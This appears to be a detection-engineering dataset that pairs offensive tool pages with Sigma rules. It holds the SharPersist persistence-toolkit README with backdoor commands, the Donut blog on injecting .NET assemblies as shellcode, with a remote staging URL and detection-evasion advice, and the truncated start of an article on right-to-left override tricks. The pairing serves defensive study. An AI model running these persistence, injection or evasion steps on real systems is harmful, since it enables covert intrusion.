{
  "0": {
    "url": "https://github.com/mandiant/SharPersist",
    "markdown": "# SharPersist\n\nWindows persistence toolkit written in C#.\n\n**For detailed usage information on each technique, see the Wiki.**\n\nAuthor - Brett Hawkins (@h4wkst3r)\n\n## Release\n\n- Public version 1.0.1 of SharPersist can be found in the Releases section\n\n## Installation/Building\n\n### Pre-Compiled\n\n- Use the pre-compiled binary in the Releases section\n\n### Building Yourself\n\nTake the below steps to setup Visual Studio in order to compile the project yourself. This requires a couple of .NET libraries that can be installed from the NuGet package manager.\n\n#### Libraries Used\n\nThe below 3rd party libraries are used in this project.\n\n| Library        | URL                                      | License     |\n| -------------- | ---------------------------------------- | ----------- |\n| TaskScheduler  | https://github.com/dahall/TaskScheduler | MIT License |\n| Fody           | https://github.com/Fody/Fody | MIT License |\n\n#### Steps to Build\n\n1. Load the Visual Studio project up and go to \"Tools\" --> \"NuGet Package Manager\" --> \"Package Manager Settings\"\n2. Go to \"NuGet Package Manager\" --> \"Package Sources\"\n3. Add a package source with the URL \"https://api.nuget.org/v3/index.json\"\n4. Install the Costura.Fody NuGet package. The older version of Costura.Fody (3.3.3) is needed, so that you do not need Visual Studio 2019.\n   - `Install-Package Costura.Fody -Version 3.3.3`\n5. Install the TaskScheduler package\n   - `Install-Package TaskScheduler -Version 2.8.11`\n6. You can now build the project yourself!\n\n## Arguments/Options\n\n- **-t** - persistence technique\n- **-c** - command to execute\n- **-a** - arguments to command to execute (if applicable)\n- **-f** - the file to create/modify\n- **-k** - registry key to create/modify\n- **-v** - registry value to create/modify\n- **-n** - scheduled task name or service name\n- **-m** - method (add, remove, check, list)\n- **-o** - optional add-ons\n- **-h** - help page\n\n## Persistence Techniques (-t)\n\n- `keepass` - backdoor keepass config file\n- `reg` - registry key addition/modification\n- `schtaskbackdoor` - backdoor scheduled task by adding an additional action to it\n- `startupfolder` - lnk file in startup folder\n- `tortoisesvn` - tortoise svn hook script\n- `service` - create new windows service\n- `schtask` - create new scheduled task\n\n## Methods (-m)\n\n- `add` - add persistence technique\n- `remove` - remove persistence technique\n- `check` - perform dry-run of persistence technique\n- `list` - list current entries for persistence technique\n\n## Optional Add-Ons (-o)\n\n- `env` - optional add-on for env variable obfuscation for registry\n- `hourly` - optional add-on for schtask frequency\n- `daily` - optional add-on for schtask frequency\n- `logon` - optional add-on for schtask frequency\n\n## Registry Keys (-k)\n\n- `hklmrun`\n- `hklmrunonce`\n- `hklmrunonceex`\n- `hkcurun`\n- `hkcurunonce`\n- `logonscript`\n- `stickynotes`\n- `userinit`\n\n## Examples\n\n### Adding Persistence Triggers (Add)\n\n**KeePass**\n\n```\nSharPersist -t keepass -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -f \"C:\\Users\\username\\AppData\\Roaming\\KeePass\\KeePass.config.xml\" -m add\n```\n\n**Registry**\n\n```\nSharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add\n```\n\n```\nSharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add -o env\n```\n\n```\nSharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"logonscript\" -m add\n```\n\n**Scheduled Task Backdoor**\n\n```\nSharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add\n```\n\n**Startup Folder**\n\n```\nSharPersist -t startupfolder -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -f \"Some File\" -m add\n```\n\n**Tortoise SVN**\n\n```\nSharPersist -t tortoisesvn -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -m add\n```\n\n**Windows Service**\n\n```\nSharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add\n```\n\n**Scheduled Task**\n\n```\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c echo 123 >> c:\\123.txt\" -n \"Some Task\" -m add\n```\n\n```\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c echo 123 >> c:\\123.txt\" -n \"Some Task\" -m add -o hourly\n```\n\n### Removing Persistence Triggers (Remove)\n\n**KeePass**\n\n```\nSharPersist -t keepass -f \"C:\\Users\\username\\AppData\\Roaming\\KeePass\\KeePass.config.xml\" -m remove\n```\n\n**Registry**\n\n```\nSharPersist -t reg -k \"hkcurun\" -v \"Test Stuff\" -m remove\n```\n\n```\nSharPersist -t reg -k \"hkcurun\" -v \"Test Stuff\" -m remove -o env\n```\n\n```\nSharPersist -t reg -k \"logonscript\" -m remove\n```\n\n**Scheduled Task Backdoor**\n\n```\nSharPersist -t schtaskbackdoor -n \"Something Cool\" -m remove\n```\n\n**Startup Folder**\n\n```\nSharPersist -t startupfolder -f \"Some File\" -m remove\n```\n\n**Tortoise SVN**\n\n```\nSharPersist -t tortoisesvn -m remove\n```\n\n**Windows Service**\n\n```\nSharPersist -t service -n \"Some Service\" -m remove\n```\n\n**Scheduled Task**\n\n```\nSharPersist -t schtask -n \"Some Task\" -m remove\n```\n\n### Perform Dry Run of Persistence Trigger (Check)\n\n**KeePass**\n\n```\nSharPersist -t keepass -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -f \"C:\\Users\\username\\AppData\\Roaming\\KeePass\\KeePass.config.xml\" -m check\n```\n\n**Registry**\n\n```\nSharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m check\n```\n\n```\nSharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m check -o env\n```\n\n```\nSharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"logonscript\" -m check\n```\n\n**Scheduled Task Backdoor**\n\n```\nSharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m check\n```\n\n**Startup Folder**\n\n```\nSharPersist -t startupfolder -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -f \"Some File\" -m check\n```\n\n**Tortoise SVN**\n\n```\nSharPersist -t tortoisesvn -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -m check\n```\n\n**Windows Service**\n\n```\nSharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m check\n```\n\n**Scheduled Task**\n\n```\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c echo 123 >> c:\\123.txt\" -n \"Some Task\" -m check\n```\n\n```\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c echo 123 >> c:\\123.txt\" -n \"Some Task\" -m check -o hourly\n```\n\n### List Persistence Trigger Entries (List)\n\n**Registry**\n\n```\nSharPersist -t reg -k \"hkcurun\" -m list\n```\n\n**Scheduled Task Backdoor**\n\n```\nSharPersist -t schtaskbackdoor -m list\n```\n\n```\nSharPersist -t schtaskbackdoor -m list -n \"Some Task\"\n```\n\n```\nSharPersist -t schtaskbackdoor -m list -o logon\n```\n\n**Startup Folder**\n\n```\nSharPersist -t startupfolder -m list\n```\n\n**Windows Service**\n\n```\nSharPersist -t service -m list\n```\n\n```\nSharPersist -t service -m list -n \"Some Service\"\n```\n\n**Scheduled Task**\n\n```\nSharPersist -t schtask -m list\n```\n\n```\nSharPersist -t schtask -m list -n \"Some Task\"\n```\n\n```\nSharPersist -t schtask -m list -o logon\n```",
    "sigma_rule": {
      "title": "HackTool - SharPersist Execution",
      "id": "26488ad0-f9fd-4536-876f-52fea846a2e4",
      "status": "test",
      "description": "Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms",
      "references": [
        "https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit",
        "https://github.com/mandiant/SharPersist"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-09-15",
      "modified": "2023-02-04",
      "tags": [
        "attack.persistence",
        "attack.t1053"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\SharPersist.exe"
          },
          {
            "Product": "SharPersist"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains": [
            " -t schtask -c ",
            " -t startupfolder -c "
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains|all": [
            " -t reg -c ",
            " -m add"
          ]
        },
        "selection_cli_3": {
          "CommandLine|contains|all": [
            " -t service -c ",
            " -m add"
          ]
        },
        "selection_cli_4": {
          "CommandLine|contains|all": [
            " -t schtask -c ",
            " -m add"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sharpersist.yml"
  },
  "1": {
    "url": "https://thewover.github.io/Introducing-Donut/",
    "markdown": "# Donut - Injecting .NET Assemblies as Shellcode\n\n*TLDR: You can now inject .NET Assemblies into Windows processes using this repo: https://github.com/TheWover/donut/*\n\n## Advancing Tradecraft - Context\n\nOffensive and red team tradecraft have changed significantly in the past year. As anti-malware systems improve their capability to detect and deter offensive tools, attackers are shifting their focus to technologies that are not observed by AV. Currently, that means operating entirely in memory and avoiding dropping files onto disk. In the Windows world, the .NET Framework provides a convenient mechanism for this. It is, however, severely restricted in that .NET programs cannot be injected directly into remote processes. In this article, we will address this issue by describing how to inject .NET code into processes via shellcode.\n\n## .NET Primer\n\nBefore we begin, you must understand a few important components of .NET.\n\n- Common Language Runtime: Like Java, .NET uses a runtime environment (or “virtual machine”) to interpret code at runtime. All .NET Code is compiled from an intermediate language to native code “Just-In-Time” before execution.\n- Common Intermediate Language: Speaking of an intermediate language, .NET uses CIL (also known as MSIL). All .NET languages (of which there are many) are “assembled” to this intermediate language. CIL is a generic object-oriented assembly language that can be interpreted into machine code for any hardware architecture. As such, the designers of .NET languages do not need to design their compilers around the architectures they will run on. Instead, they merely need to design it to compile to one language: CIL.\n- .NET Assemblies: .NET applications are packaged into .NET Assemblies. They are so called because the code from your language of choice has been “assembled” into CIL but not truly compiled. Assemblies use an extension of the PE format and are represented as either an EXE or a DLL that contains CIL rather than native machine code.\n- Application Domains: Assemblies are run inside of a safe “box” known as an Application Domain. Multiple Assemblies can exist within an AppDomain, and multiple AppDomains can exist within a process. AppDomains are intended to provide the same level of isolation between executing Assemblies as is normally provided for processes. Threads may move between AppDomains and can share objects through marshalling and delegates.\n\n## Current state of .NET Tradecraft\n\nCurrently, .NET tradecraft is limited to post-exploitation execution by one of two main ways:\n\n- Assembly.Load(): The .NET Framework’s standard library includes an API for code reflection). This Reflection API includes System.Reflection.Assembly.Load, which can be used to load .NET programs from memory. In less than five lines of code, you may load a .NET DLL or EXE from memory and execute it.\n- execute-assembly: In Cobalt Strike 3.11, Raphael Mudge introduced a command called ‘execute-assembly’ that ran .NET Assemblies from memory as if they were run from disk. This command introduced the world to .NET tradecraft and signalled the shift to Bringing Your Own Land.\n\nHowever, both execution vectors produce challenges for red teams seeking to develop flexible TTPs.\n\n### Assembly.Load\n\nWhile the Reflection API is very versatile and can be useful in many different ways, it can only run code in the current process. No support is provided for running payloads in remote processes.\n\n### execute-assembly\n\nThe main problem with execute-assembly is that it executes the same way every time. That predictability ensures that it is reliable, but also lets defenders built analytics.\n\n1. A subprocess is created using the *spawnto* executable. Mudge refers to this as a “sacrificial process” because it acts as a host for your payloads, isolating your Beacon’s process from any failure in your code.\n2. A reflective DLL is injected into the subprocess to load the .NET Runtime.\n3. The reflective DLL loads an intermediate .NET Assembly to handle errors and improve the stability of your payload.\n4. The intermediate .NET Assembly loads your .NET Assembly from memory inside the subprocess.\n5. The main entry point of your Assembly is invoked along with your command-line arguments.\n\nThe result is that execute-assembly *does* allow you to inject your .NET Assembly into a remote process. However, it does not let you inject into a running process or specify how that injection occurs. It is only modular in *what* you can run, not *how* you can run it. The most that you can do is to specify what executable is run for your sacrificial subprocess by changing the *spawnto* variable in your Malleable C2 Profile. execute-assembly also has a hidden size limitation of 1 MB for your payloads, which limits your flexibility in designing post-exploitation tools.\n\n## Moving Forward\n\nTo move past these limitations, we need a technique that meets the following requirements:\n\n- Allows you to run .NET code from memory.\n- Can work with any Windows process, regardless of its architecture and whether it has the CLR loaded.\n- Allows you to inject that code in either a remote (different) process or the local (current) process.\n- Allows you to determine in what way that injection occurs.\n- Works with multiple types of process injection.\n\nThe most flexible type of payload that meets those requirements is shellcode. But you can’t just convert a .NET Assembly to shellcode. They run through a runtime environment, not directly on the hardware. Wouldn’t it be great if we could just inject .NET Assemblies as shellcode? Yes. Yes, it would.\n\n## Introducing Donut\n\nShortly before publishing donut, Odzhan and I became aware of another team working on a shellcode generator for .NET Assemblies. They were at the same stage of their project at us. We both agreed that whomever of us published first would ensure that the other received due credit for their work. As soon as they publish their tool, we will update this article with a link. This project is CLRVoyance, published by Accenture: Link to the repo.\n\nDonut is a shellcode generation tool that creates x86 or x64 shellcode payloads from .NET Assemblies. This shellcode may be used to inject the Assembly into arbitrary Windows processes. Given an arbitrary .NET Assembly, parameters, and an entry point (such as Program.Main), it produces position-independent shellcode that loads it from memory. The .NET Assembly can either be staged from a URL or stageless by being embedded directly in the shellcode. Either way, the .NET Assembly is encrypted with the Chaskey block cipher and a 128-bit randomly generated key. After the Assembly is loaded through the CLR, the original reference is erased from memory to deter memory scanners. The Assembly is loaded into a new Application Domain to allow for running Assemblies in disposable AppDomains.\n\nDonut is currently at version 0.9 (Beta). Please share any issues or suggestions with us as Issues on GitHub. Once we have received feedback, we will release version 1.0. A link to the compiled v0.9 release can be found here.\n\nThis is a joint project between Odzhan and TheWover. Odzhan also created a blog post for v0.9 release.\n\n## How it Works\n\n### Unmanaged Hosting API\n\nMicrosoft provides an API known as the Unmanaged CLR Hosting API. This API allows for unmanaged code (such as C or C++) to host, inspect, configure, and use Common Language Runtimes. It is a legitimate API that can be used for many purposes. Microsoft uses it for several of their products, and other companies use it to design custom loaders for their programs. It can be used to improve performance of .NET applications, create sandboxes, or just do weird stuff. We do the latter.\n\nOne of the things it can do is manually load .NET Assemblies into arbitrary Application Domains. It can do this either from disk or from memory. We utilize its capability for loading from memory to load your payload without touching disk.\n\nTo see a standalone example of an Unmanaged CLR Hosting Assembly loader, check out Casey Smith’s repo: AssemblyLoader.\n\n### CLR Injection\n\nThe first action that donut’s shellcode takes is to load the CLR. Unless the user specifies the exact runtime version to use, v4.0.30319 of the CLR will be used by default, which supports the versions 4.0+ of .NET. If the attempt to load a specific version fails, then donut will attempt to use whichever one is available on the system. Once the CLR is loaded, the shellcode creates a new Application Domain. At this point, the .NET Assembly payload must be obtained. If the user provided a staging URL, then the Assembly is downloaded from it. Otherwise, it is obtained from memory. Either way, it will loaded into the new AppDomain. After the Assembly is loaded but before it is run, the decrypted copy will be released and later freed from memory with VirtualFree to deter memory scanners. Finally, the Entry Point specified by the user will be invoked along with any provided parameters.\n\nIf the CLR is already loaded into the host process, then donut’s shellcode will still work. The .NET Assembly will just be loaded into a new Application Domain within the managed process. .NET is designed to allow for .NET Assemblies built for multiple versions of .NET to run simultaneously in the same process. As such, your payload should always run no matter the process’s state before injection.\n\n### Shellcode Generation\n\nThe logic above describes how the shellcode generated by donut works. That logic is defined in payload.exe. To get the shellcode, exe2h extracts the compiled machine code from the .text segment in payload.exe and saves it as a C array to a C header file. donut combines the shellcode with a Donut Instance (a configuration for the shellcode) and a Donut Module (a structure containing the .NET assembly, class name, method name and any parameters).\n\n## Using Donut\n\nDonut can be used as-is to generate shellcode from arbitrary .NET Assemblies. Both a Windows EXE and a Python (Python planned for v1.0) script are provided for payload generation. The command-line syntax is as described below.\n\n```\nusage: donut [options] -f <.NET assembly> -c <namespace.class> -m <Method>\n\n -f <path>            .NET assembly to embed in PIC and DLL.\n -u <URL>             HTTP server hosting the .NET assembly.\n -c <namespace.class> The assembly class name.\n -m <method>          The assembly method name.\n -p <arg1,arg2...>    Optional parameters for method, separated by comma or semi-colon.\n -a <arch>            Target architecture : 1=x86, 2=amd64(default).\n -r <version>         CLR runtime version. v4.0.30319 is used by default.\n -d <name>            AppDomain name to create for assembly. Randomly generated by default.\n\nexamples:\n\n donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll\n donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe -u http://remote_server.com/modules/\n```\n\n### Generating Shellcode\n\nTo generate shellcode with donut, you must specify a .NET Assembly, an Entry Point, and any parameters that you wish to use. If your Assembly uses the *Test* namespace and includes the *Program* class with the *Main* method, then you would use the following options:\n\n```\ndonut.exe -f Test.exe -c Test.Program -m Main\n```\n\nTo generate the same shellcode for 32-bit processes, use the ‘-a’ option:\n\n```\ndonut.exe -a 1 -f Test.exe -c Test.Program -m Main\n```\n\nYou may also provide parameters to whatever Entry Point you specify. The max length of each parameter is currently 32 characters. To demonstrate this functionality, you may use the following options and our example Assembly to create shellcode that will spawn a Notepad process and a Calc process:\n\n```\n.\\donut.exe -f .\\DemoCreateProcess\\bin\\Release\\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe\n```\n\nWhen generating shellcode to run on an older Windows machine, you may need it to use v2 of the CLR, rather than v4. v2 works for versions of the .NET Framework <= 3.5, while v4 works for versions >= 4.0. By default, donut uses version 4 of the CLR. You may tell it to use v2 with the ‘-r’ option and specifying “v2.0.50727” as the parameter.\n\n```\n.\\donut.exe -r v2.0.50727 -f .\\DemoCreateProcess\\bin\\Release\\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe\n```\n\nThe name of the AppDomain for your .NET payload may be specified manually using the ‘-d’ option. By default, it will be randomly generated. You may specify a name.\n\n```\n.\\donut.exe -d ResourceDomain -r v2.0.50727 -f .\\DemoCreateProcess\\bin\\Release\\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe\n```\n\nIn order to reduce the size of your shellcode (or for many other reasons), you may specify a URL where your payload will be hosted. Donut will produce an encrypted Donut Module with a random name that you should place at the URI you specified. The name and location where you should place it will be printed to your screen when you generate the shellcode.\n\n```\n.\\donut.exe -u http://remote_server.com/modules/ -d ResourceDomain -r v2.0.50727 -f .\\DemoCreateProcess\\bin\\Release\\DemoCreateProcess.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe\n```\n\n### Demonstrating with SILENTTRINITY\n\nFor a demonstration, we will use the SILENTTRINITY RAT as a test payload. Since it is the most… ahh… complicated .NET Assembly that I could find, I used it for all of my testing. You may use any standard shellcode injection technique to inject the .NET Assembly. The DonutTest subproject is provided in the repo as an example injector. You may combine it with the DonutTest subproject to test the shellcode generator. In our case, we will first use DonutTest to inject into explorer. We also show what it looks like to use an existing implant to perform further injection using the `boo/shellcode` and `ipy/execute-assembly` post-exploitation modules.\n\n#### Generation\n\nFirst, we will generate a x64 PIC using the SILENTTRINITY DLL. Using PowerShell, we will base64-encode the result and pipe it to our clipboard.\n\nBecause we don’t know what processes will be available to inject into on-target, we will also generate a x86 PIC just in case we need it.\n\nIf you wanted to, you could use a staging server by providing the URL and copying the Donut Module to the specified location.\n\n#### Choosing a Host Process\n\nUse ProcessManager, a sub-project provided in the donut repo, to enumerate processes. ProcessManager enumerates all running processes and makes a best effort to obtain information about them. It is specifically designed to aid in determining what process to inject / migrate into. The picture below demonstrates its general usage.\n\n#### Injecting\n\nFirst, we will use DonutTest to inject into explorer using DonutTest. We pasted the encoded shellcode from above into DonutTest and rebuilt it for our test.\n\nAs you can see, the injection was successful:\n\nNow assume we already have an agent running on the machine. We can use SILENTTRINITY’s post-exploitation modules to inject implants into running processes.\n\n### Using as a Library\n\ndonut is provided as both dynamic and static libraries for both (.a / .so) and Windows (.lib / .dll). It has a simple API that is described in *docs/api.html*. Two exported functions are provided,\n\n```\nint DonutCreate(PDONUT_CONFIG c)\nint DonutDelete(PDONUT_CONFIG c)\n```\n\n### Rebuilding the shellcode\n\nYou may easily customize our shellcode to fit your use case. *payload.c* contains the .NET assembly loader, which should successfully compile with both Microsoft Visual Studio and mingw-w64. Make files have been provided for both compilers which will generate x86-64 shellcode by default unless x86 is supplied as a label to nmake/make. Whenever *payload.c* has been changed, recompiling for all architectures is recommended before rebuilding donut.\n\n#### Microsoft Visual Studio\n\nOpen the x64 Microsoft Visual Studio build environment, switch to the *payload* directory, and type the following:\n\n```\nnmake clean -f Makefile.msvc\nnmake -f Makefile.msvc\n```\n\nThis should generate a 64-bit executable (*payload.exe*) from *payload.c*. exe2h will then extract the shellcode from the *text* segment of the PE file and save it as a C array to *payload_exe_x64.h*. When donut is rebuilt, this new shellcode will be used for all payloads that it generates.\n\nTo generate 32-bit shellcode, open the x86 Microsoft Visual Studio build environment, switch to the payload directory, and type the following:\n\n```\nnmake clean -f Makefile.msvc\nnmake x86 -f Makefile.msvc\n```\n\nThis will save the shellcode as a C array to *payload_exe_x86.h*.\n\n#### Mingw-w64\n\nAssuming you’re on Linux and *mingw-w64* has been installed from packages or source, you may still rebuild the shellcode using our provided makefile. Change to the *payload* directory and type the following:\n\n```\nmake clean -f Makefile.mingw\nmake -f Makefile.mingw\n```\n\nOnce you’ve recompiled for all architectures, you may rebuild donut.\n\n### Integrating into Tooling\n\nWe hope that donut (or something inspired by it) will be integrated into tooling to provide **inject** and **migrate** functionality. To do so, we suggest one of the following methods:\n\n- As an operator, using the generator to manually generate shellcode.\n- Generate the shellcode dynamically on your C2 server, pass that down to an existing implant, and inject it into another process.\n- Use our dynamic or static libraries.\n- As a template for building your own shellcode / generator.\n- Use our Python (Python planned for v1.0) extension to script shellcode generation dynamically.\n\n## Advancing Tradecraft\n\nIt is our hope that releasing donut to the public will advance offensive and red team tradecraft in several ways:\n\n- Provide red teams and adversary emulators with a means to emulate this technique that threat actors may have developed in secret.\n- Provide blue teams a frame of reference for detecting and mitigating CLR Injection techniques.\n- Inspire tool developers to develop new types of techniques and tradecraft.\n\n### Alternative Payloads\n\nThe main benefit of using .NET Assemblies as shellcode is that they can now be executed by anything that can execute shellcode on Windows. There are many more ways to inject shellcode than there are to load Assemblies. As such, offensive tool designers no longer need to design their payloads around running .NET. Instead, they may leverage their existing payloads and techniques that use shellcode.\n\n### Injecting .NET At Will / Migration\n\nDonut will also allow the developers of C2 Frameworks / RATs to add migrate-like functionality to their tools. By using Donut as a library (or calling the generator) on the server and then providing the result to an existing agent, it may inject a new instance of itself into another running process. This may also be used to inject arbitrary post-exploitation modules so long as I/O is properly redirected.\n\n### Disposable AppDomains\n\nWhen donut loads an Assembly, it loads it into a new AppDomain. Unless the user specifies the name of the AppDomain with the ‘-d’ parameter, the AppDomain is given a random name. We specifically designed donut to run payloads in new AppDomains rather than using DefaultDomain. If this does not suit you, you can easily modify payload.c to use the default domain. By running the payload in its own AppDomain, this allows for the development of tools that run post-exploitation modules in disposable AppDomains. Application Domains can be unloaded, but individual Assemblies cannot. Therefore, to unload an Assembly when you are done with it, you must put it into its own AppDomain and unload that instead. A C# agent can have the shellcode generated on its server, inject the result into itself in a new thread, wait for the Assembly to finish executing, then unload the host AppDomain. You could also modify the shellcode itself to perform that role.\n\n### Detecting CLR Injection\n\nOne of the companion projects for donut is ModuleMonitor. It uses WMI Event Win32_ModuleLoadTrace to monitor for module loading. It provides filters, detailed data, and has an option to monitor for CLR Injection attacks.\n\nThe CLR Sentry option follows some simple logic: If a process loads the CLR, but the program is not a .NET program, then the CLR has been injected into it.\n\nWhile useful, there are both false positives and false negatives:\n\n- False Positive: There are (few) legitimate uses of the Unmanaged CLR Hosting API. If there weren’t, then Microsoft wouldn’t have made it. CLR Sentry will notice every unmanaged program that loads the CLR.\n- False Negatives: This will NOT notice injection of .NET code into processes that already have the CLR loaded. So, no use of the Reflection API and not when donut is used to inject shellcode into managed processes.\n\nPlease Note: This is intended **only** as a Proof-of-Concept to demonstrate the anomalous behavior produced by CLR injection and how it may be detected. It should not be used in any way in a production environment. You could perform the same logic with the Image Load event for Sysmon or ETW. They would be easier to scale and integrate with enterprise tooling.\n\nI am not a defender, but the following pseudocode is my attempt at an analytic that follows this logic. The DLLs that are associated with the CLR all start with “msco”, such as “mscorlib.dll” and “mscoree.dll”. As such, we watch for their loading, then check if the program that loaded them is a valid .NET Assembly.\n\n```\nvoid CLR_Injection:\nWHEN Image_Load event:\n    if event.Module.Name contains \"msco*.dll\":\n    {\n        if !(IsValidAssembly(event.Process.FilePath)):\n        {\n            print \"A CLR has been injected into \" + event.Process.Id\n        }\n    }\n```\n\nThe snippet below represents my implementation of this logic in C#. The full code can be found in ModuleMonitor.\n\n```\n//CLR Sentry\n//Author: TheWover\nwhile (true)\n{\n    //Get the module load.\n    Win32_ModuleLoadTrace trace = GetNextModuleLoad();\n\n    //Split the file path into parts delimited by a '\\'\n    string[] parts = trace.FileName.Split('\\\\');\n\n    //Check whether it is a .NET Runtime DLL\n    if (parts[parts.Length - 1].Contains(\"msco\"))\n    {\n        //Get a\n        Process proc = Process.GetProcessById((int)trace.ProcessID);\n\n        //Check if the file is a .NET Assembly\n        if (!IsValidAssembly(proc.StartInfo.FileName))\n        {\n            //If it is not, then the CLR has been injected.\n            Console.WriteLine();\n            Console.WriteLine(\"[!] CLR Injection has been detected!\");\n            //Display information from the event\n            Console.WriteLine(\"[>] Process {0} has loaded the CLR but is not a .NET Assembly:\", trace.ProcessID);\n        }\n    }\n}\n```\n\nIt is important to note that this behaviour represents all CLR Injection techniques, of which there are several. This detection should work for donut, as well as other tools such as Cobalt Strike’s ‘execute-assembly’ command.\n\n### OpSec Considerations\n\nModuleMonitor demonstrates an important point about CLR Injection: When performed against unmanaged processes, CLR Injection produces highly anomalous process behavior. The loading of a CLR after a process’s initial execution or from unmanaged code is unusual. There are few legitimate use cases. From a defender’s perspective, this allows you to build analytics that monitor for the behavior described in the section above.\n\nHowever, as I mentioned, this analytic fails to detect CLR Injection into processes that already have the CLR loaded. As such, an operator could evade the analytic by simply injecting into processes that are already managed. I would recommend the following standard operating procedure:\n\n1. Run ProcessManager from memory to enumerate processes. Take note of which you can inject into.\n2. If there are any processes that are already managed, then consider them the set of potential targets.\n3. If there are not any managed processes, then all processes are potential targets.\n4. Either way, inject / migrate into the process that is most likely to naturally produce network traffic and live the longest.\n\nOr to put it simply:\n\n- Whenever possible, prefer to inject .NET Assemblies into processes that already have the CLR loaded.\n\n## Conclusion\n\nOffensive .NET tradecraft is faced with several important challenges. One of them is the lack of means to inject into remote processes at will. While this can normally be performed with shellcode, there is no way to produce shellcode that can run a .NET Assembly directly on hardware. Any shellcode that runs a .NET Assembly must first bootstrap the Common Language Runtime and load the Assembly through it. Enter Donut. With Donut, we now have a framework for generating flexible shellcode that loads a .NET Assembly from memory. This can be combined with existing techniques and tooling to advance tradecraft in a number of ways. Hopefully, this will break down the current barriers in .NET-based exploitation and provide tool designers with a foundation for crafting more excellent tools.\n\nWritten on May 9, 2019",
    "sigma_rule": {
      "title": "DotNet CLR DLL Loaded By Scripting Applications",
      "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
      "status": "test",
      "description": "Detects .NET CLR DLLs being loaded by scripting applications such as wscript or cscript. This could be an indication of potential suspicious execution.",
      "references": [
        "https://github.com/tyranid/DotNetToJScript",
        "https://thewover.github.io/Introducing-Donut/",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008"
      ],
      "author": "omkar72, oscd.community",
      "date": "2020-10-14",
      "modified": "2023-02-23",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.t1055"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\cmstp.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msxsl.exe",
            "\\regsvr32.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ],
          "ImageLoaded|endswith": [
            "\\clr.dll",
            "\\mscoree.dll",
            "\\mscorlib.dll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_script_dotnet_clr_dll_load.yml"
  },
  "2": {
    "url": "https://redcanary.com/blog/right-to-left-override/",
    "markdown": "# “semaG dna nuF” with Right-to-Left Override Unicode Characters\n\nOriginally published September 13, 2017. Last modified April 30, 2024.\n\n---\n\n*Our Security Operations team loves to share insights on TTPs when we see them in the wild. Today we’re focusing on an oldie but a goodie: right-to-left override attacks.*\n\n## First, a Refresher on Right-to-Left (RLO) Overrides.\n\nUnicode contains several characters designed to allow right to left (RTL) characters to be inserted inside text that is normally left to right. One of these is the “RIGHT-TO-LEFT OVERRIDE” character, U+202E.\n\nFor example, we can write a normal (left to right) sentence that suddenly switches to right to left:\n\n```image\nAlt: right-to-left-override unicode attacks\nDescription: The image is a screenshot of a terminal output demonstrating the effect of the Right-to-Left Override (RLO) Unicode character, U+202E, in a Python environment. It shows a command input where a text string is printed, illustrating how the text is rendered left to right until it encounters the RLO character, after which the text appears reversed. The Python version and time of execution are also displayed, providing context for the example.\nTranscription: |\n  $ python\n  Python 2.7.12 (default, Oct 11 2016, 05:20:59)\n  >>> print u\"This is all going left to right and then 